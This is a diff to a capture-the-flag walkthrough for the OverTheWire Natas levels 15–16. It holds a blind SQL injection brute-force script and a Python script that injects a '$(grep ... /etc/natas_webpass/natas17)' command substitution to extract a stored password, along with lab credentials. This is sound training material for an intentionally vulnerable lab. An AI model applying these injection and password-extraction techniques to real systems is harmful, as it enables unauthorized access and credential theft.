@@ -1347,8 +1347,7 @@ def find_password_letters():
     letters = []
     print("Finding password letters...")
     for c in characters:
-        uri = ''.join([url, '?', 'username=natas16"',
-                      '+and+password+LIKE+BINARY+"%', c, '%', '&debug'])
+        uri = url + '?username=natas16"+and+password+LIKE+BINARY+"%' + c + '%&debug'
         r = requests.get(uri, auth=(natas15_username, natas15_password))
         if success_phrase in r.text:
             letters.append(c)
@@ -1359,13 +1358,12 @@ def find_password_letters():
 def brute_force_password(password_letters):
     print("Brute-forcing password...")
     password = ""
-    for i in range(1, 64):
+    for _ in range(1, 64):
         for c in password_letters:
-            test = "".join([password, c])
-            uri = "".join([url, '?', 'username=natas16"',
-                           '+and+password+LIKE+BINARY+"', test, '%', '&debug'])
-            r = requests.get(uri, auth=(natas15_username, natas15_password))
-            if success_phrase in r.text:
+            test = password + c
+            uri = url + '?username=natas16"+and+password+LIKE+BINARY+"' + test + '%&debug'
+            resp = requests.get(uri, auth=(natas15_username, natas15_password))
+            if success_phrase in resp.text:
                 password += c
     print("Brute-forcing password complete!")
     return password
@@ -1386,4 +1384,108 @@ All password letters found!
 Brute-forcing password...
 Brute-forcing password complete!
 Password:  hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+```
+
+## Natas 16
+
+### Credentials
+
+Username: natas16
+Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+URL: http://natas16.natas.labs.overthewire.org
+
+### Message
+
+For security reasons, we now filter even more on certain characters
+
+Find words containing: ... **Search**
+
+Output: ...
+
+### Solution
+
+Source code (link):
+
+```html
+ <html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas16", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas16</h1>
+<div id="content">
+
+For security reasons, we now filter even more on certain characters<br/><br/>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Try to brute-force as before:
+
+```python
+import requests
+import string
+
+letters = "".join([string.ascii_letters, string.digits])
+url = "http://natas16.natas.labs.overthewire.org"
+natas16_username = "natas16"
+natas16_password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
+
+
+def brute_force_password():
+    password = ""
+    while len(password) < 32:
+        for c in letters:
+            test = '$(grep -E ^' + password + c + \
+                '.* /etc/natas_webpass/natas17)'
+            uri = url + '?needle=' + test + '&submit=Search'
+            resp = requests.get(uri, auth=(natas16_username, natas16_password))
+            if len(resp.text) == 1105:
+                password += c
+                break
+    return password
+
+
+if __name__ == "__main__":
+    password = brute_force_password()
+    print(password)
+```
+
+Execution:
+
+```bash
+$ python natas16.py
+EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
 ```
